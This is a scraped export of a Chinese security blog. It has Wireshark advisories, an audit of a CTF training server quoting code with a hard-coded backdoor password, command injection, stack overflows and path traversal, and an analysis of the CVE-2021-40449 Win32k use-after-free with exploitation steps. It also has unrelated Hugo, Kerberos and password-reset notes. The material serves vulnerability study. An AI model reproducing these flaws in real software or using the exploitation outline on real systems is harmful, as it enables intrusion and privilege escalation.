onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Server审计","tags":[],"description":"","content":"代码地址\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\n编译：gcc -m32 -g -o news_server news_server.c\n目标：找出10个bug和漏洞\nnews_server默认工作在根目录，没有通过chdir切换工作目录（不知道算不算bug）\n修复：\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); 在authenticate函数存在admin后门\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate 中直接拼接用户输入到命令，命令注入\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); 栈溢出、任意文件读（目录穿越）\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) 文件写（目录穿越）、栈溢出11字节\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"给hugo-theme-learn增加timeline功能","tags":[],"description":"","content":"前言 现在使用hugo-theme-learn主题，但这个主题没有提供时间线功能，为了给首页增加时间线功能，花了两天研究了一下怎么添加时间线功能。\n为了方便增加时间线的事件，采用自定义shortcode的方式增加时间线，代码大部分参考引用链接里面的，魔改了一下以适应自己的主题，增加了过去多少天的显示。\n代码实现 在layout/shortcodes新增文件：event.html和timeline.html，内容分别如下\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // 如果月份大于1则 if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; 由于event.html里面引用了dayjs，这个js不在当前主题内，可以在config.toml新增custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]，然后把dayjs.min.js放在theme\\hugo-theme-learn\\static\\js目录内，即可解决导入dayjs的问题。\n此时可以在需要添加时间线的地方使用timeline的shortcode添加，以下是我博客首页的时间线代码：\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03至09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} 这两天，给hugo主题增加了timeline的shortcode，见[增加timeline功能](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29至09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} 周内审计了代码 {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} 除了这个还顺便给博客新增了基于Github issue的评论功能，参考\rutteranc。\n参考\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"关于我","tags":[],"description":"","content":"关于我 21年毕业，目前在某安全厂商工作，主要研究二进制，做一些应急响应方面的东西，业余也会看看web侧的一些简单漏洞，这个博客记录了我分析的一些漏洞和一些安全研究的文章。\n从小时候在电视上看到黑客在网络上上天入地无所不能，如今已入安全行业，希望能够长久保持对网络安全的好奇心，不会被消磨自己的好奇心，能够给世界留下一点属于自己的东西。\nGitHub地址 Chestnuts4\n希望可以持之以恒做安全研究。\n黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"认证原理","tags":[],"description":"","content":"认证原理 一、Kerberos概念 Kerberos是计算机网络授权协议，用于在非安全网络中，对个人通信过程中用安全的手段进行身份认证。其中客户端和服务端能够相互认证，识别对方身份。Kerberos是第三方认证，依赖于第三方服务器对彼此进行身份验证，Kerberos服务器本身成为KDC。 由三部分组成：\nKerberos知道用户和集群内服务以及各自的密码数据库 AS验证用户身份，验证通过就会返回给Client端一个TGT Client通过TGT向TGS获取ST 服务验证ST有效性，如果有效则Client可以访问服务 二、Kerberos名词解释 AS（Authentication Server）认证服务器 KDC（Key Distribution Center）密钥分发中心 TGT（Ticket Granting Ticket）票据授权票据，给票据授权的票据 TGS（Ticket Granting Service）票据授权服务 SS（Service Server）服务提供服务器 ST（Server Ticket）服务端票据 一般KDC同时包含AS和TGS\n三、Kerberos验证过程 Client登录，用户输入用户名和密码，会用单向函数根据密码生成客户端密钥（Client Secret Key）\nClient向AS发送A消息请求TGT\nA消息内容 用户名 请求服务名称，这里是TGS 网络地址 请求TGT的生命周期 该消息不会加密，也不会发送密码或者密码生成的密钥 AS检查用户名是否存在AS用户名数据库内，并使用数据库中用户密码生成的NTLM哈希解密客户端消息\n如果数据库内有该用户名则随机生成TGS会话密钥（TGS Session Key），同时给Client端发送两条消息\nB消息内容用客户端密钥加密 TGS名称 时间戳 生命周期 TGS会话密钥（TGS Session Key） C消息内容（TGT）用TGS密钥（TGS Secret Key）加密 用户名 TGS名称 时间戳 用户网络地址 生命周期 TGS会话密钥（TGS Session Key） Client用通过密码生成的客户端密钥解密B消息，如果密码正确则可以得到TGS会话密钥（TGS Session Key），将C消息（TGT）存储在本地凭据缓存内。\nClient向TGS请求ST，期间需要向TGS发送两条消息明文\nD消息内容 想要请求的服务ID即SS 生命周期 TGT E消息内容使用TGS会话密钥（TGS Session Key）加密即身份验证器 用户名 时间戳 TGS验证Client请求服务是否存在，存在则进入下一步。\nTGS提取D消息内的TGT，用TGS密钥解密（TGS Secret Key），从中提取TGS会话密钥（TGS Session Key），再用TGS会话密钥解密E得到用户名和时间戳，现在TGS得到了用户名和消息E的时间戳，以及消息C的用户名和时间戳\n比较两个用户名和时间戳 检查TGT生命周期是否过期 检查身份验证器（E消息）是否在缓存内(存疑) TGS生成随机服务会话（service session key）密钥，并发送两条消息给Client\nF消息内容用服务密钥(Service Secret Key)加密 用户名 服务名 时间戳 网络地址 生命周期 服务会话密钥 G消息内容用TGS会话密钥加密 服务名 时间戳 生命周期 服务会话密钥 因为Client有TGS会话密钥所以可以解密消息G得到服务会话密钥（service session key）\n客户端和SS连接，发送两条消息\n消息H用服务会话密钥加密内容身份验证器： 用户名 时间戳 消息L 即消息F SS收到请求，用服务密钥解密消息I即消息F得到服务会话密钥及用户名时间戳等信息，再用服务会话密钥解密消息H得到用户名和时间戳\nSS进行身份验证\n比较消息H内用户名和消息F内的用户名 比较消息H和消息F内的是时间戳 检查消息F内生命周期 检查身份验证器是否在缓存内 SS向Client验证身份，向其发送消息\n消息J使用服务会话密钥加密身份验证器 服务ID 时间戳（在消息H内的时间戳） 客户端收到SS的身份验证器消息（J），使用缓存内的服务会话密钥进行解密得到服务ID及时间戳，并验证是否有效\n参考链接\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\n简化模型 Client向AS发送明文消息，申请访问的服务 AS检查用户名是否存在本地数据库中，存在则返回两条消息 A：Client/TGS会话密钥(Client/TGS Session Key)用于Client和TGS通信，通过用户密钥加密 B：TGT（包含Client/TGS会话密钥、用户、用户网络地址、TGT有效期），通过TGS密钥加密 Client收到消息AB，用自己的用户密钥解密消息A得到和TGS通信的密钥TGS会话密钥 Client向TGS请求服务，发送两条消息 C：消息B和申请的服务ID（明文） D：认证符（包括用户ID、时间戳）通过(Client/TGS Session Key)加密 TGS拿到服务ID检查是否有该服务，如果有该服务则用TGS密钥解密消息B得到(Client/TGS Session Key)再用TGS会话密钥解密消息D得到用户ID、时间戳，与TGT内的用户ID和时间戳比对验证有效性。 通过之后TGS返回两条消息给Client E：ST（SS会话密钥、用户ID、用户网络地址、有效期）通过SS密钥加密 F：SS会话密钥，通过TGS会话密钥加密 Client通过TGS会话密钥解密消息F得到SS会话密钥 Client给SS发送两条消息 G：即消息E H：认证符，包含用户ID，时间戳，通过SS会话密钥加密 SS收到两条消息之后用SS密钥解密消息G（E）得到SS会话密钥，在通过会话密钥解密消息H得到用户ID、时间戳等信息，如果和消息G（E）内的时间戳和用户ID比对，通过则返回消息给Client I：消息H内的时间戳，通过SS会话密钥加密 Client收到消息之后用SS会话密钥解密得到时间戳，并验证，通过则可以向SS发送请求。 "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"在Windows server 2019上重置密码","tags":[],"description":"","content":"重置windows server 2019的administrator密码 之前在Vmware上的Windows server 2019的Administrator密码忘记了，使用网上的方法时找不到用PE启动系统的办法，无奈只能使用其他办法。写此文记录一下。\n设置CD/DVD 首先在虚拟机-设置的硬件选项卡下面的CD/DVD设置为使用ISO映像文件并找到windows server 2019镜像位置，如下图\n之后选择虚拟机-电源-开机时打开固件启动虚拟机，虚拟机就会进入BIOS，在BIOS里选择CD/DVD启动，即会进入下图。\n参考链接\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/","title":"CVE-2021-40449 Win32k 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"CVE-2021-40449 Win32k提权漏洞及POC分析 背景 CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。\n基本概念 内核对象：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。\n内核对象的引用计数：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：\n在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。\n句柄：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。\n句柄表：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDC：是一个内核对象，全称device context，设备上下文对象\nHDC：DC对象的句柄。\n释放后重用：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。\neg：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // 定义函数指针 typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new test对象 test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // 释放t指向的test对象的空间 delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // 占用刚释放的对象的内存空间 pt = (test *)malloc(sizeof(test)); // 将申请的空间当作test对象，并将对象的函数指针设置为恶意函数地址 pt-\u0026gt;p = badMethod; } // 这里原意想要调用method函数，但是实际调用了badMethod函数 printf(\u0026#34;第二次调用\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } 漏洞形成分析 该漏洞产生于win32kfull!GreResetDCInternal函数中，该函数内会获取DC对象内的函数指针，并执行该函数指针指向的函数，但并未检查DC对象是否异常。所以如果可以在调用函数指针之前释放DC对象，并重新申请该对象的内存空间，通过构造内存布局，修改原DC对象的函数指针指向其他任意内核函数，就可以在win32kfull!GreResetDCInternal内实现任意内核函数调用。\n根据代码，我们可以算出DCO对象和DC对象的函数指针的关系：function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 传入了hdcOpenDCW返回的HDC，但HmgSwapLockedHandleContents交换了新旧句柄对应的DC对象，此时v6句柄对应旧DC对象。 ······ 调用该函数指针的时候，所用的两个参数也是源于用户传入的HDC句柄对应的DC对象。\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\n在win32kfull!GreResetDCInternal函数的后半段会调用win32kbase!DeleteDCInternal函数释放传入该函数的HDC句柄所对应的DC对象，到这里就达成了use-after-free的free步骤。\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······· // 删除HDC句柄对应的DC对象。 bDeleteDCInternal(v6, 1i64, 0i64); 如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到use步骤让内核执行任意内核函数。\n漏洞利用分析 POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOC代码分析：\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\n要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。\n在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局。\n在函数GreResetDCInternal调用DC对象的函数指针之前会调用win32kbase!hdcOpenDCW函数。win32kbase!hdcOpenDCW函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。\n在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。此时达到了free步骤。\n在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 